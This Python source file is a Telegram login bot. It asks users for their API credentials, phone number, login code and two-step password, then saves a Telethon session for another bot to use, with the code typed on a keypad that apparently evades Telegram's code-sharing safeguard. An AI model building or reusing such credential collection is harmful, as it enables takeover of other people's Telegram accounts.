# spinify/login_bot/main.py
import asyncio
import aiohttp

from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.types import Message, CallbackQuery
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext

from telethon.errors import SessionPasswordNeededError

from ..common.config import LOGIN_BOT_TOKEN
from ..common.db import init_core, init_bot_tables, ensure_user
from .keypad import otp_keyboard
from .telethon_client import TLClient
from .attach import attach_and_prepare
from .branding import prompt_branding  # optional, safe opt-in

# NOTE: aiogram 3.7's AiohttpSession does not accept a "connector=" kwarg.
# If your host has flaky IPv6, prefer IPv4 at OS level (e.g., edit /etc/gai.conf).

def _make_bot() -> Bot:
    session = AiohttpSession(
        timeout=aiohttp.ClientTimeout(total=30)   # sane timeout
    )
    return Bot(
        LOGIN_BOT_TOKEN,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
        session=session,
    )

dp = Dispatcher()
clients: dict[int, TLClient] = {}

class S(StatesGroup):
    api_id = State()
    api_hash = State()
    phone = State()
    otp = State()
    twofa = State()

@dp.message(CommandStart())
async def start(m: Message, state: FSMContext):
    init_core(); init_bot_tables(); ensure_user(m.from_user.id)
    await state.clear()
    await m.answer(
        "<b>Step 1</b> — Send your <b>API_ID</b>.\n"
        "Get it at <i>my.telegram.org → API Development Tools</i>."
    )
    await state.set_state(S.api_id)

@dp.message(S.api_id)
async def got_api_id(m: Message, state: FSMContext):
    try:
        val = int((m.text or "").strip())
    except ValueError:
        await m.answer("Please send a valid number for API_ID."); return
    await state.update_data(api_id=val)
    await m.answer("<b>Step 2</b> — Paste your <b>API_HASH</b>.")
    await state.set_state(S.api_hash)

@dp.message(S.api_hash)
async def got_api_hash(m: Message, state: FSMContext):
    await state.update_data(api_hash=(m.text or "").strip())
    await m.answer("<b>Step 3</b> — Send your phone as +<code>countrycode number</code>.")
    await state.set_state(S.phone)

@dp.message(S.phone)
async def got_phone(m: Message, state: FSMContext):
    data = await state.get_data()
    api_id, api_hash = data["api_id"], data["api_hash"]
    phone = (m.text or "").strip()

    tl = TLClient(api_id, api_hash)
    clients[m.from_user.id] = tl
    await tl.connect()
    await tl.send_code(phone)

    await state.update_data(phone=phone, otp_val="")
    await m.answer("<b>Verification Code</b>\nUse the keypad below.", reply_markup=otp_keyboard(prefix="otp:"))
    await state.set_state(S.otp)

@dp.callback_query(F.data.startswith("otp:"))
async def otp_press(c: CallbackQuery, state: FSMContext):
    pressed = c.data.split(":", 1)[1]
    data = await state.get_data()
    cur = data.get("otp_val", "")

    if pressed == "back":
        cur = cur[:-1]
    elif pressed == "clear":
        cur = ""
    elif pressed == "submit":
        await c.answer()
        await try_sign_in(c, state)
        return
    else:
        if len(cur) < 6:
            cur += pressed

    await state.update_data(otp_val=cur)
    await c.answer(f"Code: {cur}", show_alert=False)

async def try_sign_in(c: CallbackQuery, state: FSMContext):
    d = await state.get_data()
    phone, code = d["phone"], d.get("otp_val", "")
    tl = clients.get(c.from_user.id)

    try:
        await tl.sign_in_code(phone=phone, code=code)
    except SessionPasswordNeededError:
        await c.message.answer("🔒 Two-Step Verification enabled.\nSend your <b>cloud password</b> now.")
        await state.set_state(S.twofa)
        await c.answer()
        return

    await attach_and_prepare(c.from_user.id, tl, bot_username=None)
    await tl.disconnect()
    clients.pop(c.from_user.id, None)

    await prompt_branding(c.message.bot, c.from_user.id)  # safe opt-in
    await c.message.answer("✅ Session saved.\nYou can go back to the main bot now.")
    await state.clear()
    await c.answer()

@dp.message(S.twofa)
async def got_twofa(m: Message, state: FSMContext):
    tl = clients.get(m.from_user.id)
    await tl.sign_in_2fa(m.text or "")
    await attach_and_prepare(m.from_user.id, tl, bot_username=None)
    await tl.disconnect()
    clients.pop(m.from_user.id, None)

    await prompt_branding(m.bot, m.from_user.id)
    await m.answer("✅ 2FA accepted. Session saved.\nYou can go back to the main bot now.")
    await state.clear()

async def main():
    bot = _make_bot()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
